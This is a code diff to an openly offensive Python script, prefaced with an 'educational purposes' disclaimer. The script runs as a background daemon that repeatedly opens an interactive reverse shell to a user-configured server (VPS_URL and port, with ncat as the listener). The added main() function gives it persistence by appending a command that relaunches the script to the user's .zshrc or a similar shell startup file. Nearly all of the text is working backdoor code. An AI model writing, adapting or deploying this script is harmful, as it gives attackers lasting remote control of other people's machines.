@@ -1,10 +1,14 @@
 # Note: This tool has been written as a weekend project for strictly educational purposes
 # The author does not bear any responsibility for what anyone does with the script or any modification of the same
 
-import sys, os, time, atexit, requests, signal, socket, subprocess
+import sys, os, time, atexit, signal, socket, subprocess
 
+# public IP/Domain name
 VPS_URL = ''
+# exposed port you'll be running ncat on
 VPS_PORT = 0
+# .bashrc", ".zshrc", ".profile" or any other shell setup script find in /home/[user]
+APPEND_TO = ".zshrc"
 
 class Daemon:
     def __init__(self, pidfile): self.pidfile = pidfile
@@ -103,19 +107,29 @@ class Daemon:
         pass
 
 class MyDaemon(Daemon):
-        def run(self):
-                while True:
-                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                        s.connect((VPS_URL,VPS_PORT))
-                        os.dup2(s.fileno(),0)
-                        os.dup2(s.fileno(),1)
-                        os.dup2(s.fileno(),2)
-                        subprocess.call(["/bin/sh","-i"])
-                        time.sleep(10)
+    def run(self):
+        while True:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((VPS_URL,VPS_PORT))
+            os.dup2(s.fileno(),0)
+            os.dup2(s.fileno(),1)
+            os.dup2(s.fileno(),2)
+            subprocess.call(["/bin/sh","-i"])
+            time.sleep(10)
+
+def main():
+    home = os.path.expanduser("~")
+    myname = os.path.basename(sys.argv[0])
+    path = home + '/' + APPEND_TO
+    with open(path, 'r') as shell_setup_script:
+        command = 'python3 ' + os.path.abspath(myname) + '\n'
+        if command not in shell_setup_script.read():
+            open(path, 'a').write(command)
+
+    pidfile='/tmp/%s' % myname
+    daemon = MyDaemon(pidfile)
+    daemon.start()
+    sys.exit(0)
  
 if __name__ == "__main__":
-        myname = os.path.basename(sys.argv[0])
-        pidfile='/tmp/%s' % myname
-        daemon = MyDaemon(pidfile)
-        daemon.start()
-        sys.exit(0)
+    main()
